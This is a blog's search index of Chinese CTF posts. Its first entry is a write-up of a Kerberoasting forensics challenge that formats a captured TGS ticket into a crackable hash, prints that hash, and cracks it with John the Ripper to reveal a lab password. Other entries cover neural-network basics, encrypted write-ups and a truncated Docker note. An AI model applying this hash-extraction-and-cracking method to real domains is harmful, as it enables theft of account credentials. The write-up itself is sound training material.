<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jqctf决赛 Misc kerberoasting复现</title>
      <link href="/2024/08/08/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/08/08/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有幸跟着X1cT34m的学长们京东总部打了京麒CTF的决赛，结果我盯着下面这道misc题看了一天，然后爆零了(T0T)，队伍排名也不理想，给队里的师傅们磕一个了(T0T)。。。Orz</p><p>赛后我找了出题人，询问后发现，我最最开始得到的答案三问有两问是对的（这题总共有三个问题）。。。结果后面越改越离谱，错的那问仍然一直是错的。。。我还是再沉淀沉淀吧(</p><p>下面是对这题的复现</p></blockquote><p>题目给了一个流量包kerberoasting.pcapng，要求找出以下三问的答案，拼起来求md5值就是flag：</p><p>1、总共枚举到了几个kerberoastable的用户</p><p>2、攻击者得到的kerberoastable的用户的密码</p><p>3、攻击者通过kerberoasting攻击得到权限后进行了约束委派攻击，找出与服务端存在委派关系的用户名称</p><p>首先过滤一下ldap流，可以看到其中有一条查询请求查询到了4个用户</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808152623844.png" alt="image-20240808152623844"></p><p>进一步展开可以看到，这些用户都设置了SPN，因此可以判定他们就是kerberoastable的用户</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808152809412.png" alt="image-20240808152809412"></p><p>接下来过滤一下krb5流翻找，很快就可以看到这四个用户返回的TGS-REP</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808153013132.png" alt="image-20240808153013132"></p><p>展开可以看到返回的票据，其中可以找到enc-part的cipher部分，这一部分其实就是用户密码的hash值</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808163841079.png" alt="image-20240808163841079"></p><p>但是直接用这个值肯定是不行的，需要爆破需要有一定的格式，我们可以用下面的脚本去生成正确的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encType = <span class="string">&quot;23&quot;</span></span><br><span class="line">userName = <span class="string">&quot;&quot;</span></span><br><span class="line">domain = <span class="string">&quot;&quot;</span></span><br><span class="line">spn = <span class="string">&quot;&quot;</span></span><br><span class="line">cipherText = <span class="string">&quot;&quot;</span></span><br><span class="line">formatted_string = <span class="string">&quot;$krb5tgs$&#123;0&#125;$*&#123;1&#125;$&#123;2&#125;$&#123;3&#125;*$&#123;4&#125;$&#123;5&#125;&quot;</span>.<span class="built_in">format</span>(encType, userName, domain, spn, cipherText[:<span class="number">32</span>],</span><br><span class="line">                                                               cipherText[<span class="number">32</span>:])</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br></pre></td></tr></table></figure><p>对于用户VictoriaOrbit，我们可以得到如下的1.hash文件</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*VictoriaOrbit$WHOAMIANONY.COM$whoamianony.com/VictoriaOrbit*$4f5376a8c1190acb1dfb054d25a6e75d$c7a192b7cf3277dff22d0580cb58ea74b6d329823b8e2f0b6eb6cf6b9da5b02e4eb2c4c3aee69dfaff8d7c6d6fa6a7790b565d360864049e647164c51ea1840e5a9a9d14e046848a7e406ec2d2b35966b515b1a18d2805207b3142b6e160884a99e4b823682759d69ad4d83ab5eb3112997507c3deb60e035091aecd215684a719796b87b430d79b47e93a6b205ee42d2a74f3f0a5d2266fb6bc081e346b2f1fc15dc07b1bec60b02d03e9bbc1db72c1c4baa2d16c4f2d001d4fb43f881d1d4d8f1b768c18e01b925fb034d86020380c2cebce4bd0486c223f7f5acb065272c1f7dad806f10f940fbf916861395f766fec9b018a5456cd6a236c314fb8691698dc2c8f41c4ba496a5c33b2dcc97223c6f067c0f10b890668921b34f5d53f42f768086cb2466bd2e15bf18859064d1e7f7282513f5ddefa4dc5e03e29b3f040b35c2342ca833108a3ead9a515a29fd515c63696caedad27ff3de3ead2dbd20619ca743f2797d91a3f4a77a763c9cabf09106887c0d9f02c8a572cb5763c3cbd10e026a69e25b8953dfec41320f42928ae79df79afb8031201264d9c4d22ecc2aaddda2a249ebd1deb89948deb39b485b7870c103ffc667e803a2a2ea99c549274baa3b68d59e6e4865302ed4cd78887255584b91453185aefa3f98e95107c83a9891fc26332e5f2ba71b3f48af6e698176fb7e1304406d10c76343e2e7bc72c948ca93da839629d4f107fad8bc7b5a062fae5ef4f7afbe46862c61b8113bc9ec844d8638c4cebc6b0609d3ad4fb70042b537dba62b58ade791629e342a634e6906711c6e64360ae36aa479a7fcfa6cb3ef7725a74620ddcec820bc56b8975943bb9b89d9dec3a85e2159e15b3dbccfe3d44ef9e6c690287af61271f3250b983f5c266a45444e228e1409c537bb8c00a2cb416597305a0f16443028e6bd35126d77a759b353b4a082810ba4f19b0981dd28aa185628b3a4756b2ec3a39adbc1db2c3d4667b98d306fe668a2316d21029e5070c67fea7737bf174b9dac48f8bd717685c9623f595b0201504b416285b333f073da88d47f7af8ab74b712c08073fc34dabfdaa5d952c070e93e4303287ae420752633d4115caf697eaf75b06277601961476ad0b05ff2679259443486512c90d032945a1f8a3e6707af0e23b6958ea758fbaf46034cddc42a9f38f213806d96aecf6868f0dde4acc3c522c2e337af2215d7eebe0792d4b8151a221e9465bd49058551dc8023a036448b43aab5b8afc7a3615b4d39e97c3efdb455f11c36ddc1172e51a6fabda60573452b23c338d335a7d5b3a6f8cced00b83232331add275432e837b197cee6d095f6ae95e95107c50c0e1532b4445db8395f08594c0e4682d521c2580cdf1452426af7278a4e0dbbbba0d87a926c16249a0ff5976eb65d0ee6603803e57b7621d632f048a4cd5852acdb3be2860806efca2fb616c609ff6e383289c1a232df775992edbe8c7ee2f6915ab8d807d41f00a6618062a2425b40421c45a1eae5d86af38b8</span><br></pre></td></tr></table></figure><p>接下来就是经典操作，用工具john the ripper，字典rockyou.txt进行爆破，得到明文密码4xVictoriax4</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240809000422154.png" alt="image-20240809000422154"></p><p>最后就是找存在委派关系的用户，当时比赛时我就是卡在这里了。。。然而事实上这很简单。。。</p><p>还是过滤ldap流，查看msDS-AllowedToDelegatedTo的部分，即可找到用户名WIN-CORP16</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240809001029442.png" alt="image-20240809001029442"></p><p>所以最终答案是4_4xVictoriax4_WIN-CORP16</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅学AI</title>
      <link href="/2024/07/31/%E6%B5%85%E5%AD%A6AI/"/>
      <url>/2024/07/31/%E6%B5%85%E5%AD%A6AI/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简单学点AI，防止以后CTF中遇到AI就寄。。。</p><p>本文内容多为搬运+修补，所搬运文章链接在文末</p></blockquote><h2 id="朴素感知机、神经元"><a href="#朴素感知机、神经元" class="headerlink" title="朴素感知机、神经元"></a>朴素感知机、神经元</h2><p>感知机接收多个输入信号，输出一个信号。感知机的信号只有“流 &#x2F; 不流”（1&#x2F;0）两种取值。这里我们认为 0 对应“不传递信号”， 1 对应“传递信号”。最简单的感知机就是将输入进行处理得到中间结果，再将结果经过非线性函数处理输出。一般的，我们也把上述的模型称为<strong>神经元</strong> ，又称作<strong>节点</strong>(node)或<strong>单元</strong>(unit)。</p><h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>由多个神经元可组成<strong>神经网络</strong>。每个节点可以从其他节点接收输入，或者从外部源接收输入，然后计算输出。每个输入都各自的<strong>权重</strong>（weight，即 w），用于调节该输入对输出影响的大小，节点的结构如图所示：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/image-20240731212540830.png" alt="image-20240731212540830"></p><p>其中 x1, x2 作为该节点的输入，其权重分别为 w1 和 w2。同时，还有配有<strong>偏置</strong>b（bias）的输入 ，偏置的主要功能是为每一个节点提供可训练的常量值（在节点接收的正常输入以外）。</p><h2 id="多层感知机"><a href="#多层感知机" class="headerlink" title="多层感知机"></a>多层感知机</h2><p>多层感知机（Multilayer Perceptron）缩写为 MLP，也称作前馈神经网络（Feedforward Neural Network）。它是一种基于神经网络的机器学习模型，通过多层非线性变换对输入数据进行高级别的抽象和分类。下图显示了一个最典型的 MLP，它包括包括三层： <strong>输入层、隐层（全连接层）和输出层</strong> （全连接的意思就是：上一层的任何一个神经元与下一层的所有神经元都有连接）。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-2110a4d62384a277ab700907e73e8721_b.gif" alt="动图"></p><p>它的工作分为两部分:</p><ul><li><strong>前向传播</strong> ：输入数据被馈送到输入层，然后传递到隐藏层，并最终生成输出层的输出。每一层的每一个神经元都会计算其加权输入和非线性激活函数的输出。</li><li><strong>反向传播</strong> ：在训练过程中，输出与期望的输出进行比较，产生一个误差值。这个误差随后被反向传播到网络中，权重得到相应的更新。</li></ul><h3 id="向前传播的计算"><a href="#向前传播的计算" class="headerlink" title="向前传播的计算"></a>向前传播的计算</h3><p>让我们把上面的 MLP 细节化：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-5a81c06789ad5e9323f93c6540263327_r.jpg" alt="img"></p><p>在一般情况下，参与运算的各元素都是 <strong>矩阵</strong>，其中的蓝色方块代表着 <strong>激活函数</strong>，绿色方块代表着 <strong>权重 Weight</strong> 和 <strong>偏置 Bias</strong> 。需要注意的是， ***权重和偏置对应上图中不同神经元的连线***，例如 1-&gt; 3 和 1-&gt; 4 的参数不同。详细计算方式如下图及下式：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-ec822b0f10066f097a074e1ff09167b1_r.jpg" alt="img"></p><p>在分类问题中，最后的输出层元素个数一般等于分类数目，最终的结果代表着该输入被这个 MLP 分为某一类的可能性大小，指越大，代表越可能属于该类。为了便于观测，我们通常使用 softmax 函数将将上一层的原始数据进行归一化，转化为一个(0,1)(0,1) 之间的数值，这些数值可以被当做概率分布，用来作为多分类的目标预测值。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-4452fdaaa04686aa270010f57f4db2aa_r.jpg" alt="img"></p><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>激活函数可为神经元引入非线性因素，使神经网络能够处理更复杂的问题。如果没有激活函数，那么神经网络将变为由一个巨大的线性组合构成。</p><h2 id="BP误差反向传播法"><a href="#BP误差反向传播法" class="headerlink" title="BP误差反向传播法"></a>BP误差反向传播法</h2><p>反向传播算法的核心概念是：<strong>通过比较现实输出与期望输出之间的差异，根据差异来反向更新每一层的参数，从而使现实输出更加贴近于期望输出。</strong></p><p>损失对参数梯度的反向传播可以被这样直观解释：由 A 到传播 B，即由 ∂L&#x2F;∂A∂L&#x2F;∂A 得到 ∂L&#x2F;∂B∂L&#x2F;∂B ，由导数链式法则 ∂L&#x2F;∂B&#x3D;(∂L&#x2F;∂A)⋅(∂A&#x2F;∂B)∂L&#x2F;∂B&#x3D;(∂L&#x2F;∂A)⋅(∂A&#x2F;∂B)。所以神经网络的 BP 就是通过链式法则求出L对所有参数梯度的过程。</p><p>如下图示例，输入x，经过网络的参数 w,b ，得到一系列中间结果 a,h 。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-d38c136a7b018fb3ea7344a902d0e3d1_r.jpg" alt="img"></p><p>下面是具体的推导公式</p><p>右上角的h21到a21:<br>$$<br>\frac{\partial l}{\partial a_{21}}&#x3D;\frac{\partial l}{\partial h_{21}}*\frac{\partial h_{21}}{\partial a_{21}}&#x3D;\frac{\partial l}{\partial h_{21}}*activate’(a_{21})<br>$$<br>a21到h11:<br>$$<br>L&#x3D;f(a_{21},a_{22},a_{23})\frac{\partial L}{\partial h_{11}}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial h_{11}}+\frac{\partial L}{\partial a_{22}}\frac{\partial a_{22}}{\partial h_{11}}+\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial h_{11}}&#x3D;\frac{\partial L}{\partial a_{21}}w_1+\frac{\partial L}{\partial a_{22}}w_2+\frac{\partial L}{\partial a_{23}}w_3<br>$$</p><p>$$<br>\frac{\partial L}{\partial w_1}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial w_1}&#x3D;\frac{\partial L}{\partial a_{21}}h_{11}<br>$$</p><p>$$<br>\frac{\partial L}{\partial b_{21}}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial b_{21}}&#x3D;\frac{\partial L}{\partial a_{21}}<br>$$</p><p>因此，我们可以如下图，将反向传播的表达式如下。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-4564c3328f7f007f2a046076cdac800a_r.jpg" alt="img"></p><p>当然并不是所有的反向传播都是如此即可，还有可能与向前传播时所用的激活函数有关，具体可查看<a href="https://hello-ctf.com/HC_AI/MLP/#_11">原文</a></p><p>参考文章：</p><p><a href="https://hello-ctf.com/HC_AI/MLP/">传送门一</a></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024暑假偷偷练习CTF</title>
      <link href="/2024/07/28/2024%E6%9A%91%E5%81%87%E5%81%B7%E5%81%B7%E7%BB%83%E4%B9%A0CTF/"/>
      <url>/2024/07/28/2024%E6%9A%91%E5%81%87%E5%81%B7%E5%81%B7%E7%BB%83%E4%B9%A0CTF/</url>
      
        <content type="html"><![CDATA[<p>听说隔壁Dozer的f4k3r师傅校队有内部训练，偷偷过去玩了一下，这里放一下我和f4k3r师傅一起写的wp（未用于提交），方便以后查阅使用</p><p><a href="https://f4k3r.top/2024/07/10/%E4%B8%8E%E5%8D%97%E8%88%AA%E7%9A%84%E6%9A%91%E6%9C%9F%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83WP/">传送门一</a></p><p><a href="https://f4k3r.top/2024/07/28/%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83%E7%BB%93%E8%90%A5%E8%B5%9BWP/">传送门二</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polaris 2024 Misc 招新题 第一题（需要密码）</title>
      <link href="/2024/07/23/Polaris-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/"/>
      <url>/2024/07/23/Polaris-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c5c03c6ba4f62e75efba4c6dc280d7cf1cae8fd5b7b0eb76302c408b88ae202d">825b23be34d6e48a379c92804d8d7913b80bfb012895b0b2a494eea7a99da8d9a8f92ba0a2640c516f4059eecd48968e09d7b3b1c9db24aac6327b82a3b813d8bd9ed1d83df9d509c685c5d2dcf92e56c7c84fcc5a7f3329e59af32b03165e8ee35b9196fcab97dedb6ded42c3e314b7e07d91d1e710dd5ef93aa1f972968721ee3199b7cd46c2d6ce84d33df79b47ebcb5105289eda79d9d416804b9604a8207c13c6dca7123e98e0b24dc76e14511e76154fa7ad72a225ebc2768d9ebc8f4984a405a3527e8da07653e0ead301e7935352bda18376908e1dc7b74688e00a1816ad468b32546972dc66a44cdcc9573eeccde1e3d50f4b00851c0523961a165610931f8d7b51212ab77aee3290c9b2ddc6ab44c65c25c80c06a3521c1fb050fb27f46a0339ec0e7990dbdf84dbd446aed604adef5cbe6c38b2fdec203f98527a8aef7236a2d4ac6cf256ca0c25d2430780bfc90197222988057903b15927a3bf3f23757d69ea022dd1fef1a43c5e47acdd37c617b05d8761dfb92751ae433008ab0a6dc562dad21d8dfee9d4d8d3c0e7fb87ef6b1687d69b6149247db4abf932f20050dea80cebe425801060a60e9e155e815f726c1d4b8a4831803628075730dd948cfe37fe5abe47cab725b16bd46bb101b53aadb4018ea6d2995bc406d4bc1faf411deaf9dc7c4b81537a90d8d5cdf5ef2216a110a9305311b6c0b64fff89f575608c266f7200ac1b6625a2907921207aa3c2728c51b8ffd080c81745e887eb6440bb0380531f63ce91ca616a7d9f909cacc63b41907e875cdd9849f6e8e6715e80e2fe909cfd917172a6891816507741a99501144ffc6ce8cb9547c841e7fc777fe6c830f67bb1cd6900e493b145b553b4465d397c43b8c2389fc59d55217eb8fad93eeee8f0fe84d4a5653588d61b7692d68eb4480faa848844506ddb0eb9dcef9b24438d46c7264fc7184a004bce3c6424729ba4ac7337a974f8744ab98a9937f8a50b407905422e229f5082f6b56eec9a73bff3b1daf048881d86e8cc27e174c724479f65f5a362ef02b493f3c0251bda635d1f6fd0e4ed1af7b8ccbcdb7f47466a352e6f5b8f48ba7314d73bc17668f9183977f20edc4fbec8aae8a3c0a6634719ea394c7eb4edbb42eaa6367c7d1f6178ab48206cd0c319d8590e4e2924821f4a6eda77f11de476c9d88bf8046ad65aee2e88e074a7b1275570be8417e204154b6945087dd2e41cd3e3abcfa66acc5d8513bb8be504b3784e12a2745aa973d1e42551425c9529026be5dc98edcd0cebb5ea7ccbb9d7ba4e3a18b4fa865167a78a97e328559f5c448ceadeae97e69af4ffb4fa17012748bc0df29ebf251bb3a0b6946bf041d33ab0887d695696843c09853065144cc5b63fd90f143c4ad5e3743ae7679ca11be1cf89f8c2d415a9b04065f2f2be0a3aa89f7ee6b0c11312936b3e5437c7dccf330e3951f5c353c12341d76c64e2be2caa8e031d2ee8fcb5a8759f4ba74784ab4cab3c1ce2ffcf546e30e66bf505b8caf695c5ce74981967495f71ee3cb0fa6a62ea3811db3753d88fca35c9fc5efb21e98ebadf6929f2105c4d1e69809fa9d540ba6fc3668bd7b018a3900d36d929ee58e510ca1a30991c992b870dcf65c64e111bb7d4fb9951496df41bab125258acfa0ed9475374010458de867671ebb58e5b037b35543386738264210d218b3cb3693386e4ea816397e66d74b8492e9a527917d92486b4b82067d85a9927016cd0b68d211f91a78d5497984de3917cbb9fbf368e44471a15dda6b186fb8defa8c8320c8736d461b6d0ac3b45996baeee8d35c527bf283c49597defdf8cf22f850bb668914fadd510cd173253a7939530423e52dbeb3f66604f35116fe0c2b0d57de9467b5f9e028093bdc704c9f37d148d58a1f18b7ed0af6c238d5cde03b03dc4a02cfb387ff010b616d4e7c71633d8389580c661841675b344dd89af9ed094011c6996bd68617de9d39f9f293ae20023d945aef8d0bfe20b118852b54335a639c08d1d61f767fdc3ab328308baa2899c54270c600a148e01879d0b75a20b378ed8e9e33dd42f812c15522909d98c29d8b09c6fa7f35c6802c2177ac0bc17c4365be4e493fb21d7f96725dbf28d788e3aff6c84fbca1fe5fa1fe0c02265d0743f30485f7c6c1055ca3a53ec5526e80b0b0b2347c5520b87bac90339a8a756f821911ef63304bed518af28e48fa077e0aa636fddb0b2185fe42dc527b87f138aab13582a90f574b44486ac305c8bbfbb3d002074a6e7374cc2b56bafb9c281caa3100099eba7e1e01579bf44fe4f05c257ecab3b96268e1fb05178fdf061a0eaa02d8fab2282489128ad2c05587e96c269adf3199cefac8bab732749719eb61af52b1a64fe98bb7a0c72651139eede93a7bb91235eb27e6e1bb47c7e3cb548a8f31ff58e5625237650aced3687849d06e1b8d00d16b4c25e4ef994c91147d80057437e9560aebfdc825c9af0024342a0b65b3ca2a811559c008a064b56b1100732896888dc9b702a3728b502f4eb6c24d3df123130199db23970ea57b388443965f8fefda3edac105183cda0ea051df00b583f0be069e49018577f0429407701d192a1cb9892354799a4324467eed2101e1465a081b8dad3c9f68a43ada297710220dd6c3c339cf019dfecf045511f0a3869bd9e0ec9dce63c88cbc1d61b5ac793fc44816a7c41ebb83502aab932ad8c903cb31c29740969c8dfac7f5900bf2901c2a36e99b99a958c64e3c5996bcfe73b9e9aeabba7b397841a0e5cf0d10f913b48b4026f69fea82fe5b7555e093e26e9ca7828fec2256dae4b917915afcaf07b6b6a67c5b52a89136cab7ff262774bad973a0e757d4a38aaf23eadd59fbe5f53ded1f726e86ac07da05315f33dafdd51e73eff146199a416db878622e5c03b9dc0b4c54d254cfc47c7d8830226be1ea6945ff31a826f927a268048c67f2fe10d01fb188a8fe0575088bc35aaaafa2f08198514919cac175d685771437c5bf58e1b066a2dead6f38a1adf0cf2dcb2f77b6b3148e5024c73436a0eca00ee23746e9e505c0f8d2941a369966eb806d04c6993ceb2e49dcf34e93c2b79216d14f8b425a6b5e2e305f08db001252781b9c612a678cf87d28c7d4da9374b0ef26e92eb6cc0e1cd5c3dfed1a44db7e9fd88d5df06745ff31f6f2b9f66ef4286d6216f36d0d5217c4d8a74f7f9ffcf1422d8531d6332bad7945fa3108989739ad11a88041d0c4bf8c5540a7c0fdb43c312cd588520040aa8194de2dbdec80eda32bd0e9e27ac699487761b8c64d059d77714728cd3872bf7da5d0f89381bf89fa192eea6c45605050452fd51147539adf98e1a4f6b835dd9ae72bf63e5dacd4ab17be895ff3b5cc4ac33e2dd83af4f5d880613ed8db5139c5aa479ac210b236b2b247448cc8cc1c136163349e145a80000af7730351954918132d822ebcb6cd0cf9745cc4d0286122f90b821bb3a499d287a3df9235788cecb0617f7ccf07cd9612712901bd38b8a1b7df300c1fba8d2c7ddbffe3a7ad47e8904d3251c7512b9191d551a9bdbd514e59e75dd3ae548249bdc27fec4f160f885bb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polaris 2024 Misc 招新题 第二题（需要密码）</title>
      <link href="/2024/07/23/Polaris-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98/"/>
      <url>/2024/07/23/Polaris-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f1298da7b3ed302a7fffc175c81d9b214efc9b3017dff96e7cb86c16c3e0a409">825b23be34d6e48a379c92804d8d79135d53975bf2365f2e035c8e7905b28225b86ad5516eec10ca54341c6ac523e5949566dd216f630712cd1204115aa0c78e9c3d6f3569a459cf91a9a12d76324433a497bfc882f786747f0fb94af5dfbe8d475f436ae62fd2f6f0c660ef411a891412f4991355f32dd7ccf07dc0cb1a3cf5a5d646b16beea96d015a10a499a14064c5f66763091784d6e8335575e2d7e621bdd858289884f274b0e06229a5431f297a8a8400cc686fb05637677a943f3ce51ebf67336e5b9df5a380d5fb72846425a350a38013bc200c7e4a24b60ba696e218aabbd975c1d4e438be58df9c6b63226c12c9bac5f4f4a7f1a974ae1adb7bf0d5751e6bba63e507126927ffc042f533af1c927470901efc039e7307d8095b2956e56e938d322f78a13bbff05390f782462ae9b6735c05b892578502e54ffab8d6b4d734ec5702e2e7a3eba013d340bb2d8b26ea6f08f5fac97f135f50ab4611f53c1a550fea2df3139dcd0ee66f1e8e6eadc5eaab00facaa38dad115f05598bce090f8bbf218a8e81146d89f289a3367d371c5e48ba0e73c42364dba9beb787bddbdd38a8ed7304b8d978c1de99b2bd5a69fea842da0c3a5e466660044de6a097b63be5a3f53ff448588d6d1df093c405e67b12e8f4e2fe8a610a026103564c426fe3ae9f2863fa87e9901796b9ef8d5181566c5d67be68692f1ccd83bc8021f0ada4a6b951d9fc18c969e4a47c7c6545742d143574bad9da469b5ac6c06abb630d2c0a56293b950c9fee8a322b3d8fa58e9e361a83e487ddbed5e57f9e69df111da6919982f943f4503da46c19b51a88213bcbe3382639785e3d891ea8438d673fb77cec3d1ef487a86c2f72454179535bfa1dd4bf4a754f3a18612f4d3157053822217829b51ddb65b07701b7874595898af77db01bbd15aa41f507508329322ff0c0c7fb40b2c30ce0c81b3af0255174f5aeaf69d71c8ae5ffd39f400f7272810d62d7f94d7e96b3c5fc5c321addecf9e90e81e5c38ed18d879ca84e6c475779ccad51337072b17a882dc93cb06de887c5e8433671b9a052c9c80d4d50da2aead17a3adde560a3d47329e75388d81a05219c004137ef60392e4a2845c1f35f8a491a2f0f6aeee99315d74f67620c7ae0c9f4efafd070e37b04f965ef546b665cad8a6958f8c9ccc654da18a85966f90176c290013984bcfaa3fdc9848f7b7c08bfc3b8d12359b253165b37e2881b29fd73777d1150f0d7e80cc7d735898715e5c5c8d5e9909efbbd2d95228ca2f9935036b7e6dd3e354d894c32a1fe2f11daabae18474bf8f75a872e91f4c921edcac79276a5dad30fc861d745dee9580154eb81b3bc32cd6928d5a6fde08cb73b3ad61d9ad0a13c979d1024f67b1b50b563974bf0368daa7b8d1dfdc4c689ddc1b5d69e3df9ae2b33c99ed5eba479a1a6c207b4edf7feabe58daefff4f0b8a0a3071ebdcbe458bb5ec84d025909eb05f46bf3cefb14f78f5325f17b9c0811a0a222f8ab722f5deae2fb8027925e868db64ebcbd66b647125e4dae2c3aaf339c2fcbe8e0a7be850ee1fd9baaff638e71c4eafea17c9b89a842b48f93bf5f6b587a9b8a36385aafe1f57df902f6a48f904b50db868c0d8c766583ecc88cc4f2fbfddf1ce0e564d34de226274c456be9b4c8cb635e6e127b93f6cc09831663ed373df9accf0e36612699220401167f10e9a461595cd26345447188ee1dbe2a603da61a8a6c2f22b74c5993f01a1750d5a3bfb4fd986addea94c4d5d4941a8a4bd9e0510aaed43b50fc15c9d707ce47d7ffe1c36a6a087c7d1c3455460ec02cdee158a6b9256e2d315741be45cd7d8d56ea7c3f2119af83ed03cfafc7c49aea78afbb87f411d8db7e8556c8fbeae8f44fc43bbde9714f5a28aa3a3028640539b8b52092cad27fe738cba1ac0df1d33e8086f1b04597e802ad39806679d821beb832fddd5286dee53f78fac41f712a6567a07559aa01f3671d503067a10348935df4b718f24e16c344eaed0858d8deaeb03d62aeeb50126f35ecb246953556f49bc6841c22c4ca0c09409ff7dc2b8004ef307a47a4b90d54b5f1d69f5d8797ca53a4b423478d79d40642a27816af20387417f1a9c49f52b5e8eaa4a6ebec48fb3f1b0d6058264fdf1aa7cc13765db9ba0a84ce63aa0dc92363ae6e94a1cf7058c7dcc8fc5827bebfe53a1ac7599a006007e2752fd2e2028c1e5d7a4aacd0726a330cedbcbb54f0375fd2fa7c5326ffbf59284e842771c840e9ce25143bae3c7b9cea969961c99f53f62cf70a0349785af5f84f1f1f3d5e51c7d9db3ac65afe91e246cfabf2e74cc24a8d0ce8abef20a15d0d86374b553613279705a8312bd9e61375222d607c084c06aed674c7a0af3a384eec1447761ed3d4ec3bb80340935b2882e220d516049ee42e85f160d7c21ae6d9e57ea119c15f8cfdb460d559d1cffa0107da78f5610a6cfad5ef27e3f23b6cc864da4996555b2976017cba1e05306f6b90ed96333368c59bd3859660c97be174056d4ccc7cc065bd1d5a55afc9cc59bdde4ea3374e32bbf07f37e8e8b36976fd0effd3918c8dd212b05768ab0e139b0536efe0964d907f99a2fb7037c3bdce1c31f9b74f3c25a6e7c2473abc78e6eade4bef749a50f0e4cf6a548c7d59d2f9e428b4528d6d8825aaaf6a93fae16266f71482027b466b9361ca6efe2b8fcc990ddc025a480a0fdda363a8da88b5e551447d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装使用记录（极简版）</title>
      <link href="/2024/07/20/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
